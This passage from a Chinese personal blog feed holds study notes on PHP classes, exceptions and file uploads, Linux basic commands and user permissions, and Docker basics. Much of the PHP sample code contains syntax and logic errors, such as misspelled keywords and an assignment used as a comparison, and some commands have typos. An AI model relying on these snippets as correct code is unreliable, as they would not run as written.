    <link href="http://blog.wendelltong.xyz/old_post/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://blog.wendelltong.xyz/old_post/php学习笔记.html</id>
    <published>2019-04-09T03:34:16.000Z</published>
    <updated>2019-07-01T05:14:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>笔记<br><a id="more"></a></p><h1 id="php-基础"><a href="#php-基础" class="headerlink" title="php 基础"></a>php 基础</h1><h1 id="php-对象"><a href="#php-对象" class="headerlink" title="php 对象"></a>php 对象</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li><p>多态</p></li><li><p>继承</p><ul><li>仅允许继承一个父类</li></ul></li></ul><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//  创建类</span><br><span class="line">class classname()&#123;</span><br><span class="line">// 以下操作符，不光可以设置属性，也可以设置，函数</span><br><span class="line">public $attribute1; // 默认为public，可以不指定，可以在类的内部和外部访问</span><br><span class="line">private  $attribute2; // 只能在类的内部访问，不会被继承</span><br><span class="line">proctected  $attribute3; // 只能在类的内部访问，可以被继承,继承后只能在子类访问</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function operation($param)&#123;</span><br><span class="line">$this-&gt;$attribute1=1;            // this指向当前实例化的对象，可以操作对象值</span><br><span class="line">&#125;</span><br><span class="line">// 构造函数，创建变量时自动执行 php5</span><br><span class="line">function __construct($param)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// 析构函数，销毁一个类时自动执行</span><br><span class="line">function __destruct($param)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// 外部属性的设置</span><br><span class="line">function __get($attriname)&#123;</span><br><span class="line">return $attriname;// 重写直接访问实例化对象属性的返回值</span><br><span class="line">&#125;</span><br><span class="line">function __set($attriname,param)&#123;</span><br><span class="line">$attriname=$param;// 重写直接设置实例化对象属性的值</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 类的实例化</span><br><span class="line"></span><br><span class="line">$a = new classnew(&quot;Fisrt&quot;); //参数会传入__construct</span><br><span class="line"></span><br><span class="line">// 继承</span><br><span class="line"></span><br><span class="line">class B extends A&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Final class A()&#123;  //禁止A类被继承</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 重载</span><br><span class="line">//子类的同名属性和方法会重载父类的</span><br><span class="line">class A()&#123;  //禁止A类的这个函数被子类重载</span><br><span class="line"></span><br><span class="line">final function operation()&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 接口,为解决不能多重继承的问题，一个类实现多个接口，</span><br><span class="line"></span><br><span class="line">interface Displayble()   //定义接口</span><br><span class="line">&#123;</span><br><span class="line">const B=&quot;1&quot;;</span><br><span class="line">function display()； 接口只有抽象函数，和静态常量</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 高级功能</span><br><span class="line"></span><br><span class="line">// pre-class 常量</span><br><span class="line">class Math()&#123;</span><br><span class="line">const PL=3.14 //常量，可以不需要初始化该类而使用</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &apos;Math::pi=&apos;.Math::pi.&apos;\n&apos;;</span><br><span class="line"></span><br><span class="line">// 静态方法</span><br><span class="line"></span><br><span class="line">再类的方法前加static 可以在为初始化类前通过和pre-class一样的方式调用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 检查类的类型和类型提示</span><br><span class="line"></span><br><span class="line">$b instanceof B;// 检查b是不是B的实例化，B也可以为父类</span><br><span class="line"></span><br><span class="line">function check_hink(B $someclass)&#123;&#125; ; // 要求传入的对象必须为B或B子类的实例化</span><br><span class="line"></span><br><span class="line">// 延迟静态绑定</span><br><span class="line"></span><br><span class="line">public static funtion test()&#123;</span><br><span class="line">static::who();          // 当在子类调用父类这个方法时，这个方法会调用子类重载的who方法</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 克隆对象</span><br><span class="line"></span><br><span class="line">$c = clone $b; //$c 完整克隆对象$b，会调用c的__clone()方法</span><br><span class="line"></span><br><span class="line">//抽象类</span><br><span class="line"></span><br><span class="line">// 类不能被实例化，对应的方法也没有实现，主要用于负责的类层次关系中</span><br><span class="line"></span><br><span class="line">abstract class A&#123;</span><br><span class="line">abstract funtion operationX();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// __call 重载方法</span><br><span class="line"></span><br><span class="line">public funtion _call($method,$p)&#123;</span><br><span class="line">if($method=&quot;display&quot;)&#123;</span><br><span class="line">display($p[0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// __autoload 方法</span><br><span class="line"></span><br><span class="line">//一个独立的函数，定义在类外，将在任何类实例化时调用</span><br><span class="line"></span><br><span class="line">funtion __autoload($name)&#123;</span><br><span class="line">include_once($name.&apos;.php&apos;);</span><br><span class="line">&#125; //实现包含类初始化需要的和类名字相同的文件</span><br></pre></td></tr></table></figure><p>// 迭代器和迭代</p><p>// __toString</p><p>// 类的实例可以通过字符串显示</p><p>// 反射API</p><p>// 获得类的详细信息</p><pre><code>$classInfo = new ReflectionClass(&apos;Page&apos;);</code></pre><h1 id="php异常处理"><a href="#php异常处理" class="headerlink" title="php异常处理"></a>php异常处理</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 引发异常</span><br><span class="line"></span><br><span class="line">throw new FileopenExpection();</span><br><span class="line">    </span><br><span class="line">// 异常处理</span><br><span class="line">try&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e)&#123;</span><br><span class="line">echo $e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;用户定义的异常都继承与exception类，可以重新toString函数</span><br></pre></td></tr></table></figure><h1 id="mysql-数据库"><a href="#mysql-数据库" class="headerlink" title="mysql 数据库"></a>mysql 数据库</h1><h1 id="电子商务与安全性"><a href="#电子商务与安全性" class="headerlink" title="电子商务与安全性"></a>电子商务与安全性</h1><h1 id="PHP高级技术"><a href="#PHP高级技术" class="headerlink" title="PHP高级技术"></a>PHP高级技术</h1><h2 id="文件交互"><a href="#文件交互" class="headerlink" title="文件交互"></a>文件交互</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="php-ini-相关指令"><a href="#php-ini-相关指令" class="headerlink" title="php.ini 相关指令"></a>php.ini 相关指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_uploads // 控制是否允许http方式进行文件上传</span><br><span class="line"></span><br><span class="line">upload_tmp_dir #指定文件被处理之前的临时目录，如果没有指定，则为系统默认值</span><br><span class="line"></span><br><span class="line">upload_max_filesize #控制允许上传的最大大小，如果大于该值，则创建一个0size的占位文件，默认2M</span><br><span class="line"></span><br><span class="line">post_max_size # post方法上传数据的最大值，默认8m，必须大于文件上传的值</span><br></pre></td></tr></table></figure><h4 id="文件上传的html代码"><a href="#文件上传的html代码" class="headerlink" title="文件上传的html代码"></a>文件上传的html代码</h4><p>可以使用POST也可以使用PUT，</p><ul><li>在form的标记中，必须设置属性enctype=”multipart/form-data”</li><li>必须有一个设置上传文件最大长度的表单域，这是一个隐藏的域名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILW_SIZE&quot; value=&quot;10000&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="编写处理的php"><a href="#编写处理的php" class="headerlink" title="编写处理的php"></a>编写处理的php</h4><p>当文件被上传时，文件保存在临时目录中，如果脚本执行完不操作，文件将会被删除</p><p>需要处理的数据在$FILE中</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://blog.wendelltong.xyz/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="php 基础" scheme="http://blog.wendelltong.xyz/tags/php-%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>linux 基础</title>
    <link href="http://blog.wendelltong.xyz/old_post/linux-%E5%9F%BA%E7%A1%80.html"/>
    <id>http://blog.wendelltong.xyz/old_post/linux-基础.html</id>
    <published>2019-04-09T03:34:16.000Z</published>
    <updated>2019-04-09T14:52:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>笔记<br><a id="more"></a></p><h1 id="文件-和目录"><a href="#文件-和目录" class="headerlink" title="文件 和目录"></a>文件 和目录</h1><p>无盘符，之间根目录/</p><ul><li>ls<ul><li>可以加选项 -a显示隐藏文件 -h 转换显示的大小格式 -l显示详细信息，以列表的方式，-ahl -a -h -l无影响，</li><li>可以以其他路径作为参数，参数和选项的前后位置无影响</li><li>也可以使用类似正则表达式显示特定文件，一个任意字符是“？”</li></ul></li><li>cd </li><li>cat<ul><li>cat 1.txt 2.txt &gt;3.txt 可以合并文件 </li></ul></li><li>pwd</li><li>touch</li><li>mkdir</li><li>rmdir</li><li>clear<ul><li>可以使用ctrl+l</li></ul></li><li>rm<ul><li>-i 删除每个文件前都提示</li><li>-f强制删除，忽略不存在 的文件，不提示</li><li>递归删除目录下的内容，删文件必须加这个参数</li></ul></li><li>ln<ul><li>软连接 ln -s 源文件 链接文件 类似快捷方式，源文件删了就没用了</li><li>硬链接 直接ln，增加文件的引用计数，删源文件，计数不为0，其实没删 </li></ul></li><li>mv 重命名<ul><li>mv 源文件 重命名文件</li></ul></li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-f</td><td>禁止交互式操作，如有覆盖也不会给出提示</td></tr><tr><td>-i</td><td>确认交互方式操作，如果mv操作将导致对已存在的目标文件的覆盖，系统会询问是否重写，要求用户回答以避免误覆盖文件</td></tr><tr><td>-v</td><td>显示移动进度</td></tr></tbody></table><ul><li>cp 复制文件</li></ul><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-a</td><td>该选项通常在复制目录时使用，它保留链接、文件属性，并递归地复制目录，简单而言，保持文件原有属性。</td></tr><tr><td>-f</td><td>已经存在的目标文件而不提示</td></tr><tr><td>-i</td><td>交互式复制，在覆盖目标文件之前将给出提示要求用户确认</td></tr><tr><td>-r</td><td>若给出的源文件是目录文件，则cp将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名。</td></tr><tr><td>-v</td><td>显示拷贝进度</td></tr></tbody></table><ul><li>归档管理<ul><li>tar -cvf test.tar *<ul><li>将当前目录所有文件打包为test.tar</li></ul></li><li>tar -xvf test.tar<ul><li>解包</li></ul></li><li>gzip 压缩tar打包的文件<ul><li>gzip test.tar test.tar.gz </li><li><ul><li>d 解压</li></ul></li><li>-f 压缩所有子目录</li><li>可以利用tar的-z选项调用gzip<ul><li>tar -zcvf test.tar.gz *</li><li>tar -zxvf test.tar.gz <ul><li>可以利用 -C 指定解压目录</li></ul></li></ul></li><li>bzip2同gzip另一种压缩格式<ul><li>压缩用法：tar -jcvf 压缩包包名 文件…(tar jcvf bk.tar.bz2 *.c)</li><li>解压用法：tar -jxvf 压缩包包名 (tar jxvf bk.tar.bz2)</li></ul></li></ul></li><li>文件压缩解压：zip、unzip<ul><li>通过zip压缩文件的目标文件不需要指定扩展名，默认扩展名为zip。<ul><li>压缩文件：zip [-r] 目标文件(没有扩展名) 源文件</li><li>解压文件：unzip -d 解压后目录文件 压缩文件</li></ul></li></ul></li></ul></li></ul><ul><li>grep<ul><li>搜索文本</li><li>grep [-选项] ‘搜索内容串’文件名</li><li>可以 -V 求反，-n 显示匹配的行号，-i 忽略大小写</li><li>搜索内容串可以使用正则</li></ul></li><li>find<ul><li>查找文件</li><li>find ./ -name test.sh</li><li>查找当前目录下所有名为test.sh的文件，可以使用正则</li><li>选项 大于2m，-size +2M  等于2m -size 2M，-perm 0777 权限是<h1 id="用户权限管理"><a href="#用户权限管理" class="headerlink" title="用户权限管理"></a>用户权限管理</h1><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2></li></ul></li><li>whoami 查看当前用户</li><li>查看登录用户<h2 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h2>exit</li></ul><h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2><h3 id="账号"><a href="#账号" class="headerlink" title="账号"></a>账号</h3><p>useradd</p><ul><li>-d 指定主目录</li><li>自动建立主目录</li><li>-g 指定组名称</li></ul><p>示例： useradd -d /home/a a -g test -m</p><p>passwd 设置密码<br>超级管理员可以给普通用户设置密码<br>用户可以对自己使用，不用加用户名</p><p>userdel<br>删除用户</p><p>userdel -r abc(用户名)</p><p>-r 同时删除主目录</p><p>su 切换用户，加- 同时进入主目录su - root</p><h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>一个账号可以有多个组，一个默认组<br>查看有那些组</p><ul><li>cat /etc/group</li><li>groupmod +三次tab键</li></ul><p>添加、删除组账号：groupadd、groupdel，基本同user</p><p>修改用户所在组：usermod</p><p>usermod -G 用户组 用户名</p><ul><li>-a表示追加，-g表示改变默认组</li><li>想要使用sudo，需要把用户加入 adm和shudo组里面<br>sudo usermod -a -G adm 用户名</li></ul><p>sudo usermod -a -G sudo 用户名</p><p>查看用户在哪些组<br>groups 用户名</p><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>修改文件权限：chmod</p><ul><li>字母法：chmod u/g/o/a +/-/= rwx 文件名</li><li><p>数字法 </p><ul><li>chmod 777 test/ -R </li><li>-R 表示递归的给所有目录加权限</li><li>读4，写2，执1，无任何权限0，顺序是所有者，同组，其他</li></ul><p>修改文件所有者：chown</p><p>chown 用户名 文件</p></li></ul><p> 修改文件所属组：chgrp</p><p>  chown 组名 文件</p><h1 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h1><p>查看进程 ps -aux</p><p>动态显示 top</p><p>kill 终止进程<br>kill [-signal] pid</p><p>kill -9 pid<br>表示强制终止</p><p>关机<br>shutdown<br>init 0<br>重启<br>reboot<br>init 6</p><h2 id="磁盘相关"><a href="#磁盘相关" class="headerlink" title="磁盘相关"></a>磁盘相关</h2><p>检测磁盘空间：df -m</p><p>检测目录所占磁盘空间：du</p><p>du -s build -h</p><h2 id="网卡"><a href="#网卡" class="headerlink" title="网卡"></a>网卡</h2><p>ifconfig<br>查看信息</p><p>sudo ifconfig ens33 192.166.1.110 修改ip</p><p>ping </p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="帮助文档"><a href="#帮助文档" class="headerlink" title="帮助文档"></a>帮助文档</h2><ul><li><p>命令自带<br>ls –help</p></li><li><p>man<br>f 翻一屏<br>b 上翻一屏</p><p>空格 显示下一屏<br>回车 下一行<br>h 列出所有功能键<br>/word 搜索word字串符</p></li></ul><h2 id="自动补全"><a href="#自动补全" class="headerlink" title="自动补全"></a>自动补全</h2><p> TAb</p><h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><p> history</p><p> 可以使用！+命令前的数字编号快速执行</p><h2 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h2><p> which 命令</p><h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><ul><li>分屏显示：more<br>具体快捷键同man</li></ul><ul><li>管道<ul><li>|</li><li>把前一命令的输出作为后面的输入</li></ul></li><li>重定向<ul><li><blockquote><p> 写入文件同w</p></blockquote></li><li><blockquote><blockquote><p>写文件同a</p></blockquote></blockquote></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="杂乱" scheme="http://blog.wendelltong.xyz/categories/%E6%9D%82%E4%B9%B1/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="linux 基础" scheme="http://blog.wendelltong.xyz/tags/linux-%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>linux 基础</title>
    <link href="http://blog.wendelltong.xyz/old_post/Untitled%202.html"/>
    <id>http://blog.wendelltong.xyz/old_post/Untitled 2.html</id>
    <published>2019-04-09T03:34:16.000Z</published>
    <updated>2019-06-19T13:57:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>笔记<br><a id="more"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="杂乱" scheme="http://blog.wendelltong.xyz/categories/%E6%9D%82%E4%B9%B1/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="linux 基础" scheme="http://blog.wendelltong.xyz/tags/linux-%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://blog.wendelltong.xyz/old_post/%E7%88%AC%E8%99%AB.html"/>
    <id>http://blog.wendelltong.xyz/old_post/爬虫.html</id>
    <published>2019-03-31T02:02:49.000Z</published>
    <updated>2019-05-28T05:49:06.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>rss制作</title>
    <link href="http://blog.wendelltong.xyz/old_post/rss%E5%88%B6%E4%BD%9C.html"/>
    <id>http://blog.wendelltong.xyz/old_post/rss制作.html</id>
    <published>2019-03-24T13:38:38.000Z</published>
    <updated>2019-03-24T14:07:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>微信，普通博客 rss的制作，一些博客的整理<br><a id="more"></a></p><h1 id="微信rss制作"><a href="#微信rss制作" class="headerlink" title="微信rss制作"></a>微信rss制作</h1><h1 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;微信，普通博客 rss的制作，一些博客的整理&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="学习方法相关" scheme="http://blog.wendelltong.xyz/categories/%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="rss" scheme="http://blog.wendelltong.xyz/tags/rss/"/>
    
      <category term="自制" scheme="http://blog.wendelltong.xyz/tags/%E8%87%AA%E5%88%B6/"/>
    
      <category term="资讯" scheme="http://blog.wendelltong.xyz/tags/%E8%B5%84%E8%AE%AF/"/>
    
  </entry>
  
  <entry>
    <title>Djang部署教程</title>
    <link href="http://blog.wendelltong.xyz/old_post/Djang%E9%83%A8%E7%BD%B2%E6%95%99%E7%A8%8B.html"/>
    <id>http://blog.wendelltong.xyz/old_post/Djang部署教程.html</id>
    <published>2019-03-23T11:32:16.000Z</published>
    <updated>2019-03-31T09:30:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>传智博客的python的笔记<br><a id="more"></a></p><p>算了，下次部署的时候再写吧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;传智博客的python的笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web开发" scheme="http://blog.wendelltong.xyz/categories/web%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Django" scheme="http://blog.wendelltong.xyz/tags/Django/"/>
    
      <category term="python" scheme="http://blog.wendelltong.xyz/tags/python/"/>
    
      <category term="web开发" scheme="http://blog.wendelltong.xyz/tags/web%E5%BC%80%E5%8F%91/"/>
    
      <category term="mvt" scheme="http://blog.wendelltong.xyz/tags/mvt/"/>
    
      <category term="mvc" scheme="http://blog.wendelltong.xyz/tags/mvc/"/>
    
  </entry>
  
  <entry>
    <title>Docker 基础</title>
    <link href="http://blog.wendelltong.xyz/old_post/docker.html"/>
    <id>http://blog.wendelltong.xyz/old_post/docker.html</id>
    <published>2019-03-23T11:32:16.000Z</published>
    <updated>2019-03-31T01:56:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>第一本Docker书，笔记<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><ul><li>Docker客户端和服务端</li></ul><p>Docker是c/s 架构的程序，Docker 客户端向Docker服务器或守护进程发送请求，服务器或者守护进程将完成所有工作并返回结果，可以将守护进程和客户端分开，也可以运行在同一宿主机</p><ul><li>镜像</li></ul><p>类似面向对象里的类</p><ul><li>Registry</li></ul><p>Docker利用Registry保存用户构建的镜像，分共有和私用两种</p><p>可以在Docker Hub在注册账号，分享自己的镜像，可以公有也可以私有</p><p>可以自己搭建 registry</p><ul><li>Docker 容器</li></ul><p>类似对象</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>百度-</p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="info-命令"><a href="#info-命令" class="headerlink" title="info 命令"></a>info 命令</h2><p>返回所有容器和镜像的数量，使用的执行驱动和储存驱动。</p><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><pre><code>docker help run或者 man docker-run</code></pre><h2 id="容器的运行"><a href="#容器的运行" class="headerlink" title="容器的运行"></a>容器的运行</h2><pre><code>docker run --name hello -i -t ubuntu:15.10 /bin/bash</code></pre><p>解析：</p><ul><li>run 表示运行一个容器，</li><li>-i 表示 STDIN 是开启的，即开启持久的标准输入</li><li>-t 表示 为容器分配一个伪tty终端，即提供一个交互式shell</li><li>接下来告诉Docker以什么创建容器，引号后面指定版本，可以不指定，实例使用的是base镜像，如果本机有，直接使用，没有则从仓库拉取</li><li>最后告诉容器运行什么命令，即运行一个交互式shell</li><li>退出shell后容器就会停止运行，因为容器基于bash启动，bash结束，容器结束</li><li>–name 为容器指定一个名字</li><li>-v 将本机目录挂载为容器的一个卷，<img src="/old_post/docker/20190331092255398.png" alt><br>前面是本机目录，后面是容器目录<br>可以指定状态，ro，只读，或rw 读写</li></ul><p><img src="/old_post/docker/20190330055728490.png" alt></p><p>使用参数-d 创建守护式容器，后台运行</p><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>列出当前运行的容器<br>加上-a 后，会列出所有，包括已经停止的<br>-l 会列出最后一次运行的容器，包括已停止的的<br>-n 3 列出最后3个容器</p><h3 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h3><pre><code>docker attach id or name</code></pre><p>附着到该容器的会话上</p><h3 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a>exec 命令</h3><p>在容器内部额外启动新进程</p><h4 id="运行一个后台进程"><a href="#运行一个后台进程" class="headerlink" title="运行一个后台进程"></a>运行一个后台进程</h4><pre><code>docker exec -d  name touch /ect/new_file</code></pre><h4 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h4><pre><code>docker exec -t -t name  /bin/bash</code></pre><h3 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h3><pre><code>docker logs name or id </code></pre><p>获取容器的日志</p><p>可以添加-f参数 来一直监控Docker的日志<br>-t 参数，为日志加上时间戳<br><img src="/old_post/docker/20190330060116468.png" alt></p><h3 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h3><p>用法同上，查看容器的进程</p><h3 id="inspect-命令"><a href="#inspect-命令" class="headerlink" title="inspect 命令"></a>inspect 命令</h3><p>获取容器信息，<img src="/old_post/docker/20190330061710794.png" alt><br><img src="/old_post/docker/20190330061801529.png" alt></p><h2 id="启动与关闭"><a href="#启动与关闭" class="headerlink" title="启动与关闭"></a>启动与关闭</h2><pre><code>docker start container_name或者id</code></pre><p>运行一个已经停止的容器，<br>restart命令，重新运行一个新容器</p><h2 id="stop-命令"><a href="#stop-命令" class="headerlink" title="stop 命令"></a>stop 命令</h2><pre><code>使用stop命令，可以停止守护进程，向容器发送STGERM信号快速停止使用 kill 命令，发送SIGKILL信号</code></pre><h2 id="restart-标志"><a href="#restart-标志" class="headerlink" title="restart 标志"></a>restart 标志</h2><p>  自动重启容器<br> <img src="/old_post/docker/20190330061334719.png" alt></p><p> always 表示无论退出代码是什么，都自动重启，标志还有on-failure 表示只有退出代码非0才会自动重启，可以接受一个可选参数 on-failure:3 </p><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><p>删除容器</p><pre><code>docker rm `docker ps -a -q`</code></pre><p> 删除所有容器，-表示只返回容器id</p><h2 id="容器内基本使用"><a href="#容器内基本使用" class="headerlink" title="容器内基本使用"></a>容器内基本使用</h2><ul><li>hostname<br>在容器内的shell使用，查看容器的id</li><li>cat /etc/hosts</li><li>ip a </li><li>ps -aux </li><li><img src="/old_post/docker/20190330054651301.png" alt></li><li>exit 或者ctrl—+d 退出容器</li></ul><h1 id="Docker-镜像和仓库"><a href="#Docker-镜像和仓库" class="headerlink" title="Docker 镜像和仓库"></a>Docker 镜像和仓库</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><ul><li>Docker 镜像由文件系统叠加而成，利用联合加载（union mount），这些文件系统称之为镜像，镜像启动容器时会在在最顶层加载一个文件读写系统，</li><li>写时复制，文件系统的变化只应用在读写层，底层不变，</li></ul><h2 id="基本操作"><a href="#基本操作" class="headerlink" 